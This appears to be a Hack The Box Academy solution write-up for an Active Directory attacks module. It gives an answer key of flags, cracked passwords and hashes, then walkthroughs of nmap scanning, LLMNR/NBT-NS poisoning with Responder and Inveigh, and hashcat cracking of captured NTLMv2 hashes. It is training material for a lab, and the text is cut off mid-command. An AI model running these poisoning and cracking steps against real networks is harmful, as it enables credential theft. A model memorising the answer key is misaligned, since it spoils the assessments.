| Section                                                           | Question Number | Answer                                        |
| ----------------------------------------------------------------- | --------------- | --------------------------------------------- |
| External Recon and Enumeration Principles                         | Question 1      | HTB{5Fz6UPNUFFzqjdg0AzXyxCjMZ}                |
| Initial Enumeration of the Domain                                 | Question 1      | ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL           |
| Initial Enumeration of the Domain                                 | Question 2      | 172.16.5.130                                  |
| LLMNR/NBT-NS Poisoning - from Linux                               | Question 1      | backupagent                                   |
| LLMNR/NBT-NS Poisoning - from Linux                               | Question 2      | h1backup55                                    |
| LLMNR/NBT-NS Poisoning - from Linux                               | Question 3      | transporter@4                                 |
| LLMNR/NBT-NS Poisoning - from Windows                             | Question 1      | security#1                                    |
| Enumerating & Retrieving Password Policies                        | Question 1      | 7                                             |
| Enumerating & Retrieving Password Policies                        | Question 2      | 8                                             |
| Password Spraying - Making a Target User List                     | Question 1      | 56                                            |
| Internal Password Spraying - from Linux                           | Question 1      | sgage                                         |
| Internal Password Spraying - from Windows                         | Question 1      | dbranch                                       |
| Credentialed Enumeration - from Linux                             | Question 1      | mmorgan                                       |
| Credentialed Enumeration - from Linux                             | Question 2      | 10                                            |
| Credentialed Enumeration - from Windows                           | Question 1      | 13                                            |
| Credentialed Enumeration - from Windows                           | Question 2      | Test-AdminAccess                              |
| Credentialed Enumeration - from Windows                           | Question 3      | sa                                            |
| Credentialed Enumeration - from Windows                           | Question 4      | ILFREIGHTDB01!                                |
| Living Off the Land                                               | Question 1      | 4.18.2109.6                                   |
| Living Off the Land                                               | Question 2      | adunn                                         |
| Living Off the Land                                               | Question 3      | HTB{LD@P\_I$\_W1ld}                           |
| Kerberoasting - from Linux                                        | Question 1      | !SapperFi2                                    |
| Kerberoasting - from Linux                                        | Question 2      | Account Operators                             |
| Kerberoasting - from Windows                                      | Question 1      | svc\_vmwaresso                                |
| Kerberoasting - from Windows                                      | Question 2      | Virtual01                                     |
| Access Control List (ACL) Abuse Primer                            | Question 1      | DACL                                          |
| Access Control List (ACL) Abuse Primer                            | Question 2      | GenericAll                                    |
| ACL Enumeration                                                   | Question 1      | 00299570-246d-11d0-a768-00aa006e0529          |
| ACL Enumeration                                                   | Question 2      | ResolveGUIDs                                  |
| ACL Enumeration                                                   | Question 3      | GenericWrite                                  |
| ACL Enumeration                                                   | Question 4      | GenericAll                                    |
| ACL Enumeration                                                   | Question 5      | Self-Membership                               |
| ACL Abuse Tactics                                                 | Question 1      | SyncMaster757                                 |
| DCSync                                                            | Question 1      | syncron                                       |
| DCSync                                                            | Question 2      | Mycleart3xtP@ss!                              |
| DCSync                                                            | Question 3      | 4bb3b317845f0954200a6b0acc9b9f9a              |
| Privileged Access                                                 | Question 1      | bdavis                                        |
| Privileged Access                                                 | Question 2      | ACADEMY-EA-DC01                               |
| Privileged Access                                                 | Question 3      | 1m\_the\_sQl\_@dm1n\_n0w!                     |
| Bleeding Edge Vulnerabilities                                     | Question 1      | 2021-42278&2021-42287                         |
| Bleeding Edge Vulnerabilities                                     | Question 2      | D0ntSl@ckonN0P@c!                             |
| Miscellaneous Misconfigurations                                   | Question 1      | ygroce                                        |
| Miscellaneous Misconfigurations                                   | Question 2      | Pass@word                                     |
| Domain Trusts Primer                                              | Question 1      | LOGISTICS.INLANEFREIGHT.LOCAL                 |
| Domain Trusts Primer                                              | Question 2      | FREIGHTLOGISTICS.LOCAL                        |
| Domain Trusts Primer                                              | Question 3      | BiDirectional                                 |
| Attacking Domain Trusts - Child -> Parent Trusts - from Windows   | Question 1      | S-1-5-21-2806153819-209893948-922872689       |
| Attacking Domain Trusts - Child -> Parent Trusts - from Windows   | Question 2      | S-1-5-21-3842939050-3880317879-2865463114-519 |
| Attacking Domain Trusts - Child -> Parent Trusts - from Windows   | Question 3      | f@ll1ng\_l1k3\_d0m1no3$                       |
| Attacking Domain Trusts - Child -> Parent Trusts - from Linux     | Question 1      | 49a074a39dd0651f647e765c2cc794c7              |
| Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows | Question 1      | 1logistics                                    |
| Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux   | Question 1      | sapsso                                        |
| Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux   | Question 2      | pabloPICASSO                                  |
| Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux   | Question 3      | burn1ng\_d0wn\_th3\_f0rest!                   |
| Additional AD Auditing Techniques                                 | Question 1      | COMPLETE                                      |
| AD Enumeration & Attacks - Skills Assessment Part I               | Question 1      | JusT\_g3tt1ng\_st@rt3d!                       |
| AD Enumeration & Attacks - Skills Assessment Part I               | Question 2      | svc\_sql                                      |
| AD Enumeration & Attacks - Skills Assessment Part I               | Question 3      | lucky7                                        |
| AD Enumeration & Attacks - Skills Assessment Part I               | Question 4      | spn$*r0ast1ng\_on*@n\_0p3n\_f1re              |
| AD Enumeration & Attacks - Skills Assessment Part I               | Question 5      | tpetty                                        |
| AD Enumeration & Attacks - Skills Assessment Part I               | Question 6      | Sup3rS3cur3D0m@inU2eR                         |
| AD Enumeration & Attacks - Skills Assessment Part I               | Question 7      | DCSync                                        |
| AD Enumeration & Attacks - Skills Assessment Part I               | Question 8      | r3plicat1on\_m@st3r!                          |
| AD Enumeration & Attacks - Skills Assessment Part II              | Question 1      | AB920                                         |
| AD Enumeration & Attacks - Skills Assessment Part II              | Question 2      | weasal                                        |
| AD Enumeration & Attacks - Skills Assessment Part II              | Question 3      | aud1t\_gr0up\_m3mbersh1ps!                    |
| AD Enumeration & Attacks - Skills Assessment Part II              | Question 4      | BR086                                         |
| AD Enumeration & Attacks - Skills Assessment Part II              | Question 5      | Welcome1                                      |
| AD Enumeration & Attacks - Skills Assessment Part II              | Question 6      | D@ta\_bAse\_adm1n!                            |
| AD Enumeration & Attacks - Skills Assessment Part II              | Question 7      | s3imp3rs0nate\_cl@ssic                        |
| AD Enumeration & Attacks - Skills Assessment Part II              | Question 8      | exc3ss1ve\_adm1n\_r1ights!                    |
| AD Enumeration & Attacks - Skills Assessment Part II              | Question 9      | CT059                                         |
| AD Enumeration & Attacks - Skills Assessment Part II              | Question 10     | charlie1                                      |
| AD Enumeration & Attacks - Skills Assessment Part II              | Question 11     | acLs\_f0r\_th3\_w1n!                          |
| AD Enumeration & Attacks - Skills Assessment Part II              | Question 12     | 7eba70412d81c1cd030d72a3e8dbe05f              |

## Acronyms Used in Writeups

| Acronym | Meaning |
| --- | --- |
| STMIP | Spawned Target Machine IP Address |
| STMPO | Spawned Target Machine Port |
| PMVPN | Personal Machine with a Connection to the Academy's VPN |
| PWNIP | Pwnbox IP Address (or PMVPN IP Address) |
| PWNPO | Pwnbox Port (or PMVPN Port) |

# External Recon and Enumeration Principles

## Question 1

### "While looking at Inlanefreight's public records; A flag can be seen. Find the flag and submit it. (format == HTB{\*\*\*\*\*\*} )"

There are multiple methods that students can utilize to find the flag.

The first method is whereby students search on [Hurricane Electric](https://bgp.he.net/) for `inlanefreight.com` and check the `TXT` record to find `HTB{5Fz6UPNUFFzqjdg0AzXyxCjMZ}`:

![[HTB Solutions/CAPE/z. images/e94dcab032b51bb210691137c95fd277_MD5.jpg]]

The second method is whereby students utilize `nslookup` and specify `TXT` as the type of the information query:

Code: shell

```shell
nslookup -type=TXT inlanefreight.com
```

```
┌─[us-academy-1]─[10.10.14.61]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ nslookup -type=TXT inlanefreight.com

Server:		1.1.1.1
Address:	1.1.1.1#53

Non-authoritative answer:
inlanefreight.com	text = "HTB{5Fz6UPNUFFzqjdg0AzXyxCjMZ}"
```

Answer: `HTB{5Fz6UPNUFFzqjdg0AzXyxCjMZ}`

# Initial Enumeration of the Domain

## Question 1

### "From your scans, what is the "commonName" of host 172.16.5.5 ?"

After spawning the target machine, students first need to connect to it with `SSH` using the credentials `htb-student:HTB_@cademy_stdnt!`:

Code: shell

```shell
ssh htb-student@STMIP
```

```
┌─[us-academy-1]─[10.10.14.61]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ssh htb-student@10.129.206.246

The authenticity of host '10.129.206.246 (10.129.206.246)' can't be established.
ECDSA key fingerprint is SHA256:BG+VzltzkKbaMbC5FR8GU9x0pcbUBhct6AGrnjH/CHg.
Are you sure you want to continue connecting (yes/no/[fingerprint])? Yes
Warning: Permanently added '10.129.206.246' (ECDSA) to the list of known hosts.
htb-student@10.129.206.246's password:

Linux ea-attack01 5.15.0-15parrot1-amd64 #1 SMP Debian 5.15.15-15parrot2 (2022-02-15) x86_64
 ____                      _     ____            
|  _ \ __ _ _ __ _ __ ___ | |_  / ___|  ___  ___ 
| |_) / _\` | '__| '__/ _ \| __| \___ \ / _ \/ __|
|  __/ (_| | |  | | | (_) | |_   ___) |  __/ (__ 
|_|   \__,_|_|  |_|  \___/ \__| |____/ \___|\___|
   
Last login: Sat Apr  9 18:29:27 2022 from 10.10.14.15

┌─[htb-student@ea-attack01]─[~]
└──╼ $
```

Students then need to perform an `Nmap` scan against the host `172.16.5.5`. Under port 3389, students will find that the `SSL-Cert` has the `fully qualified name` of the host as `ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL`:

Code: shell

```shell
sudo nmap -A -v -Pn 172.16.5.5
```

```
┌─[htb-student@ea-attack01]─[~]
└──╼ $sudo nmap -A -v -Pn 172.16.5.5

<SNIP>

3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: INLANEFREIGHT
|   NetBIOS_Domain_Name: INLANEFREIGHT
|   NetBIOS_Computer_Name: ACADEMY-EA-DC01
|   DNS_Domain_Name: INLANEFREIGHT.LOCAL
|   DNS_Computer_Name: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
|   Product_Version: 10.0.17763
|_  System_Time: 2022-06-18T03:24:18+00:00
|_ssl-date: 2022-06-18T03:24:29+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
| Issuer: commonName=ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-03-28T03:51:03
| Not valid after:  2022-09-27T03:51:03
| MD5:   ad6e bfa4 279c 98a2 2e11 803b eb22 714f
|_SHA-1: 09f4 56aa 86c7 5059 1d93 d0f4 72fe 423a 264f 841d
MAC Address: 00:50:56:B9:F6:98 (VMware)

<SNIP>
```

Answer: `ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL`

# Initial Enumeration of the Domain

## Question 2

### "What host is running "Microsoft SQL Server 2019 15.00.2000.00"? (IP address, not Resolved name)"

Using the same SSH connection established in the previous question, students need to perform an `Nmap` scan against the entire `172.16.5.0/23` subnet; for easier finding of the SQL Server, the output of `Nmap` will be saved to a file using the `grepable` format:

Code: shell

```shell
sudo nmap -A -Pn -T5 -oG ./nmapOutput 172.16.5.0/23
```

```
┌─[htb-student@ea-attack01]─[~]
└──╼ $sudo nmap -A -Pn -T5 -oG ./nmapOutput 172.16.5.0/23

<SNIP>

Nmap scan report for 172.16.5.130
Host is up (0.0033s latency).
Not shown: 992 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
808/tcp   open  ccproxy-http?
____________________________________________________________________________

1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
____________________________________________________________________________
| Not valid before: 2022-06-18T03:12:19
|_Not valid after:  2052-06-18T03:12:19
|_ssl-date: 2022-06-18T04:20:50+00:00; 0s from scanner time.
| ms-sql-ntlm-info: 
|   Target_Name: INLANEFREIGHT
|   NetBIOS_Domain_Name: INLANEFREIGHT
|   NetBIOS_Computer_Name: ACADEMY-EA-FILE
|   DNS_Domain_Name: INLANEFREIGHT.LOCAL
|   DNS_Computer_Name: ACADEMY-EA-FILE.INLANEFREIGHT.LOCAL
|   DNS_Tree_Name: INLANEFREIGHT.LOCAL
|_  Product_Version: 10.0.17763

<SNIP>
```

Students will find out that the `172.16.5.130` host is running `Microsoft SQL Server 2019 15.00.2000.00` by reading the output of `Nmap`. However, since the output was saved to a file in the `grepable` format, students instead can find the answer using `awk`:

Code: shell

```shell
awk '/1433\/open/ {print $2}' nmapOutput
```

```
┌─[htb-student@ea-attack01]─[~]
└──╼ $awk '/1433\/open/ {print $2}' nmapOutput

172.16.5.130
```

Answer: `172.16.5.130`

# LLMNR/NBT-NS Poisoning - from Linux

## Question 1

### "Run Responder and obtain a hash for a user account that starts with the letter b. Submit the account name as your answer."

After spawning the target machine, students first need to connect to it with `SSH` using the credentials `htb-student:HTB_@cademy_stdnt!`:

Code: shell

```shell
ssh htb-student@STMIP
```

```
┌─[us-academy-1]─[10.10.14.61]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ssh htb-student@10.129.206.246

htb-student@10.129.206.246's password: 

Linux ea-attack01 5.15.0-15parrot1-amd64 #1 SMP Debian 5.15.15-15parrot2 (2022-02-15) x86_64
 ____                      _     ____            
|  _ \ __ _ _ __ _ __ ___ | |_  / ___|  ___  ___ 
| |_) / _\` | '__| '__/ _ \| __| \___ \ / _ \/ __|
|  __/ (_| | |  | | | (_) | |_   ___) |  __/ (__ 
|_|   \__,_|_|  |_|  \___/ \__| |____/ \___|\___|

Last login: Sat Apr  9 18:29:27 2022 from 10.10.14.15

┌─[htb-student@ea-attack01]─[~]
└──╼ $
```

Students then need to start capturing requests with `Responder` using the default settings (waiting for approximately five minutes). The account's name is `backupagent`:

Code: shell

```shell
sudo responder -I ens224
```

```
┌─[us-academy-1]─[htb-student@ea-attack01]─[~]
└──╼ $sudo responder -I ens224
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[SMB] NTLMv2-SSP Client   : 172.16.5.130
[SMB] NTLMv2-SSP Username : INLANEFREIGHT\backupagent
[SMB] NTLMv2-SSP Hash     : backupagent::INLANEFREIGHT:1968fc543f996645:A3668BA58243EC7E92EF495785AFBBD6:010100000000000000821F57AF82D801C652E35F08D60A320000000002000800460042004100590001001E00570049004E002D004600370052005500440058005000450033004C005A0004003400570049004E002D004600370052005500440058005000450033004C005A002E0046004200410059002E004C004F00430041004C000300140046004200410059002E004C004F00430041004C000500140046004200410059002E004C004F00430041004C000700080000821F57AF82D80106000400020000000800300030000000000000000000000000300000E6A9FDA8EE8660B99F59FF8448621935E25B42391978DBD28C49A8121CB5D8BD0A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000
```

Answer: `backupagent`

# LLMNR/NBT-NS Poisoning - from Linux

## Question 2

### "Crack the hash for the previous account and submit the cleartext password as your answer."

From the previous question, students need to save the hash of the user `backupagent` into a file on their workstations:

Code: shell

```shell
echo "backupagent::INLANEFREIGHT:1968fc543f996645:A3668BA58243EC7E92EF495785AFBBD6:010100000000000000821F57AF82D801C652E35F08D60A320000000002000800460042004100590001001E00570049004E002D004600370052005500440058005000450033004C005A0004003400570049004E002D004600370052005500440058005000450033004C005A002E0046004200410059002E004C004F00430041004C000300140046004200410059002E004C004F00430041004C000500140046004200410059002E004C004F00430041004C000700080000821F57AF82D80106000400020000000800300030000000000000000000000000300000E6A9FDA8EE8660B99F59FF8448621935E25B42391978DBD28C49A8121CB5D8BD0A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000" > capturedHash.txt
```

```
┌─[us-academy-6]─[10.10.14.87]─[htb-ac-8414@htb-wqsbhm99ib]─[~]
└──╼ [★]$ echo "backupagent::INLANEFREIGHT:1968fc543f996645:A3668BA58243EC7E92EF495785AFBBD6:010100000000000000821F57AF82D801C652E35F08D60A320000000002000800460042004100590001001E00570049004E002D004600370052005500440058005000450033004C005A0004003400570049004E002D004600370052005500440058005000450033004C005A002E0046004200410059002E004C004F00430041004C000300140046004200410059002E004C004F00430041004C000500140046004200410059002E004C004F00430041004C000700080000821F57AF82D80106000400020000000800300030000000000000000000000000300000E6A9FDA8EE8660B99F59FF8448621935E25B42391978DBD28C49A8121CB5D8BD0A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000" > capturedHash.txt
```

Then, students need to use `Hashcat` to crack the hash using the "rockyou.txt.gz" passwords wordlist using hashmode `5600`; students will find out that the plaintext password of the cracked hash is `h1backup55`. Alternatively, students can use `john` to crack the hash:

Code: shell

```shell
hashcat -m 5600 -w 3 -O capturedHash.txt /usr/share/wordlists/rockyou.txt.gz
```

```
┌─[us-academy-6]─[10.10.14.87]─[htb-ac-8414@htb-wqsbhm99ib]─[~]
└──╼ [★]$ hashcat -m 5600 -w 3 -O capturedHash.txt /usr/share/wordlists/rockyou.txt.gz

hashcat (v6.2.6) starting

<SNIP>

Host memory required for this attack: 1 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344393
* Bytes.....: 139921526
* Keyspace..: 14344386
* Runtime...: 2 secs

BACKUPAGENT::INLANEFREIGHT:1968fc543f996645:a3668ba58243ec7e92ef495785afbbd6:010100000000000000821f57af82d801c652e35f08d60a320000000002000800460042004100590001001e00570049004e002d004600370052005500440058005000450033004c005a0004003400570049004e002d004600370052005500440058005000450033004c005a002e0046004200410059002e004c004f00430041004c000300140046004200410059002e004c004f00430041004c000500140046004200410059002e004c004f00430041004c000700080000821f57af82d80106000400020000000800300030000000000000000000000000300000e6a9fda8ee8660b99f59ff8448621935e25b42391978dbd28c49a8121cb5d8bd0a001000000000000000000000000000000000000900220063006900660073002f003100370032002e00310036002e0035002e003200320035000000000000000000:h1backup55
   
<SNIP>
```

Answer: `h1backup55`

# LLMNR/NBT-NS Poisoning - from Linux

## Question 3

### "Run Responder and obtain an NTLMv2 hash for the user wley. Crack the hash using Hashcat and submit the user's password as your answer."

Using the same SSH connection established in the previous question, students need to start capturing requests with `Responder` using the default settings (and wait for less than five minutes (approximately), to obtain the `NTLMv2` hash of the user `wley`:

Code: shell

```shell
sudo responder -I ens224
```

```
┌──[htb-student@ea-attack01]─[~]
└──╼ $sudo responder -I ens224
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

    NBT-NS, LLMNR & MDNS Responder 3.0.6.0

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[SMB] NTLMv2-SSP Client   : 172.16.5.130
[SMB] NTLMv2-SSP Username : INLANEFREIGHT\wley
[SMB] NTLMv2-SSP Hash     : wley::INLANEFREIGHT:34b5da22defa8787:16E73BD834B38699109B701D643FCD39:010100000000000080EEF606B482D801BE3398AC6A162E6F0000000002000800430031004A00520001001E00570049004E002D00410042004A003300350039005100390033003900580004003400570049004E002D00410042004A00330035003900510039003300390058002E00430031004A0052002E004C004F00430041004C0003001400430031004A0052002E004C004F00430041004C0005001400430031004A0052002E004C004F00430041004C000700080080EEF606B482D8010600040002000000080030003000000000000000000000000030000012F579948338E31E73C081A2AF97E62ADD97CADE5F7854FD1B3B64B879B221240A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000
```

Then, once captured, students need to save the hash into a file on their workstations:

Code: shell

```shell
echo "wley::INLANEFREIGHT:34b5da22defa8787:16E73BD834B38699109B701D643FCD39:010100000000000080EEF606B482D801BE3398AC6A162E6F0000000002000800430031004A00520001001E00570049004E002D00410042004A003300350039005100390033003900580004003400570049004E002D00410042004A00330035003900510039003300390058002E00430031004A0052002E004C004F00430041004C0003001400430031004A0052002E004C004F00430041004C0005001400430031004A0052002E004C004F00430041004C000700080080EEF606B482D8010600040002000000080030003000000000000000000000000030000012F579948338E31E73C081A2AF97E62ADD97CADE5F7854FD1B3B64B879B221240A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000" > wleyCapturedHash.txt
```

```
┌─[us-academy-6]─[10.10.14.87]─[htb-ac-8414@htb-wqsbhm99ib]─[~]
└──╼ [★]$ echo "wley::INLANEFREIGHT:34b5da22defa8787:16E73BD834B38699109B701D643FCD39:010100000000000080EEF606B482D801BE3398AC6A162E6F0000000002000800430031004A00520001001E00570049004E002D00410042004A003300350039005100390033003900580004003400570049004E002D00410042004A00330035003900510039003300390058002E00430031004A0052002E004C004F00430041004C0003001400430031004A0052002E004C004F00430041004C0005001400430031004A0052002E004C004F00430041004C000700080080EEF606B482D8010600040002000000080030003000000000000000000000000030000012F579948338E31E73C081A2AF97E62ADD97CADE5F7854FD1B3B64B879B221240A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000" > wleyCapturedHash.txt
```

Subsequently, students need to use `Hashcat` to crack the hash using the "rockyou.txt.gz" passwords wordlist, utilizing hashmode 5600; students will find out that the plaintext password of the cracked hash is `transporter@4`. Alternatively, students can use `john` to crack the hash:

Code: shell

```shell
hashcat -m 5600 -w 3 -O wleyCapturedHash.txt /usr/share/wordlists/rockyou.txt.gz
```

```
┌─[us-academy-6]─[10.10.14.87]─[htb-ac-8414@htb-wqsbhm99ib]─[~]
└──╼ [★]$ hashcat -m 5600 -w 3 -O wleyCapturedHash.txt /usr/share/wordlists/rockyou.txt.gz

hashcat (v6.2.6) starting

<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344386
* Bytes.....: 139921526
* Keyspace..: 14344386

WLEY::INLANEFREIGHT:34b5da22defa8787:16e73bd834b38699109b701d643fcd39:010100000000000080eef606b482d801be3398ac6a162e6f0000000002000800430031004a00520001001e00570049004e002d00410042004a003300350039005100390033003900580004003400570049004e002d00410042004a00330035003900510039003300390058002e00430031004a0052002e004c004f00430041004c0003001400430031004a0052002e004c004f00430041004c0005001400430031004a0052002e004c004f00430041004c000700080080eef606b482d8010600040002000000080030003000000000000000000000000030000012f579948338e31e73c081a2af97e62add97cade5f7854fd1b3b64b879b221240a001000000000000000000000000000000000000900220063006900660073002f003100370032002e00310036002e0035002e003200320035000000000000000000:transporter@4

<SNIP>
```

Answer: `transporter@4`

# LLMNR/NBT-NS Poisoning - from Windows

## Question 1

### "Run Inveigh and capture the NTLMv2 hash for the svc\_qualys account. Crack and submit the cleartext password as the answer."

After spawning the target machine, students first need to connect to it with `xfreerdp` using the credentials `htb-student:Academy_student_AD!`:

Code: shell

```shell
xfreerdp /v:STMIP /u:htb-student /p:Academy_student_AD!
```

```
┌─[us-academy-1]─[10.10.14.12]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ xfreerdp /v:10.129.149.107 /u:htb-student /p:Academy_student_AD!

<SNIP>

Certificate details for 10.129.149.107:3389 (RDP-Server):
	Common Name: ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL
	Subject:     CN = ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL
	Issuer:      CN = ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL
	Thumbprint: 2e:a1:7e:ac:38:d1:b5:99:8b:30:0b:ca:1a:2a:dd:0d:f3:c0:f6:79:e4:98:89:b8:08:66:d8:7f:98:c0:f2:37
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N)Y
<SNIP>
```

When prompted with the "Computer Access Policy" message, students need to click on "OK":

![[HTB Solutions/CAPE/z. images/ac67db6ef6ca65d9afaef96ffc4b32ab_MD5.jpg]]

Once they access the spawned target machine, students need to run `PowerShell` as administrator, navigate to the `C:\Tools\` directory and import `Inveigh.ps1`:

Code: powershell

```powershell
Import-Module .\Inveigh.ps1
```

```
PS C:\Tools> Import-Module .\Inveigh.ps1
```

Subsequently, students need to start `Inveigh` and provide it flags that will make it save its output to a text file (and wait for approximately five minutes):

Code: powershell

```powershell
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

```
PS C:\Tools> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y

[*] Inveigh 1.506 started at 2022-06-17T23:10:46
[+] Elevated Privilege Mode = Enabled
[+] Primary IP Address = 172.16.5.25
[+] Spoofer IP Address = 172.16.5.25
[+] ADIDNS Spoofer = Disabled
[+] DNS Spoofer = Enabled
[+] DNS TTL = 30 Seconds
[+] LLMNR Spoofer = Enabled
[+] LLMNR TTL = 30 Seconds
[+] mDNS Spoofer = Disabled
[+] NBNS Spoofer For Types 00,20 = Enabled
[+] NBNS TTL = 165 Seconds
[+] SMB Capture = Enabled
[+] HTTP Capture = Enabled
[+] HTTPS Capture = Disabled
[+] HTTP/HTTPS Authentication = NTLM
[+] WPAD Authentication = NTLM
[+] WPAD NTLM Authentication Ignore List = Firefox
[+] WPAD Response = Enabled
[+] Kerberos TGT Capture = Disabled
[+] Machine Account Capture = Disabled
[+] Console Output = Full
[+] File Output = Enabled
[+] Output Directory = C:\Tools

<SNIP>

[+] [2022-06-17T23:13:10] SMB(445) NTLMv2 captured for INLANEFREIGHT\svc_qualys from 172.16.5.130(ACADEMY-EA-FILE):50370:
svc_qualys::INLANEFREIGHT:F9CAC827FD6ABFBF:4CF1F3B24BF1BF34D3ECC049D9FC7052:010100000000000086E60D7CDA82D801DFB87B40C430171C0000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00450041002D004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004600410043004100440045004D0059002D00450041002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000700080086E60D7CDA82D801060004000200000008003000300000000000000000000000003000006C04F59E654683B7ABEECE956F72B3A9164B0BD891DE9D612B30FF3E26D79F510A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0035002E00320035000000000000000000
WARNING: [!] [2022-06-17T23:13:10] SMB(445) NTLMv2 written to Inveigh-NTLMv2.txt

<SNIP>
```

The hash of `svc_qualys` is captured and displayed by `Inveigh`.

Alternatively, students can retrieve the hash from the file that `Inveigh` has used to write the `NTLMv2` hashes into:

Code: shell

```shell
type .\Inveigh-NTLMv2.txt | Select-String -Pattern "svc_qualys"
```

```
PS C:\Tools> type .\Inveigh-NTLMv2.txt | Select-String -Pattern "svc_qualys"

svc_qualys::INLANEFREIGHT:F9CAC827FD6ABFBF:4CF1F3B24BF1BF34D3ECC049D9FC7052:010100000000000086E60D7CDA82D801DFB87B40C430171C0000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00450041002D004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004600410043004100440045004D0059002D00450041002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000700080086E60D7CDA82D801060004000200000008003000300000000000000000000000003000006C04F59E654683B7ABEECE956F72B3A9164B0BD891DE9D612B30FF3E26D79F510A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0035002E00320035000000000000000000
```

Students then need to copy the hash into their clipboard, because, they need to save it to into a file inside of `Pwnbox`/`PMVPN`:

Code: powershell

```powershell
type .\Inveigh-NTLMv2.txt | Select-String -Pattern "svc_qualys" | Clip
```

```
PS C:\Tools> type .\Inveigh-NTLMv2.txt | Select-String -Pattern "svc_qualys" | Clip
```

Now, students can kill the `xfreerdp` session, go back to `Pwnbox`/`PMVPN`, and save the hash into a file:

Code: shell

```shell
echo "
svc_qualys::INLANEFREIGHT:F9CAC827FD6ABFBF:4CF1F3B24BF1BF34D3ECC049D9FC7052:010100000000000086E60D7CDA82D801DFB87B40C430171C0000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00450041002D004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004600410043004100440045004D0059002D00450041002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000700080086E60D7CDA82D801060004000200000008003000300000000000000000000000003000006C04F59E654683B7ABEECE956F72B3A9164B0BD891DE9D612B30FF3E26D79F510A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0035002E00320035000000000000000000" > svc_qualysCapturedHash.txt
```

```
┌─[us-academy-1]─[10.10.14.61]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ echo "
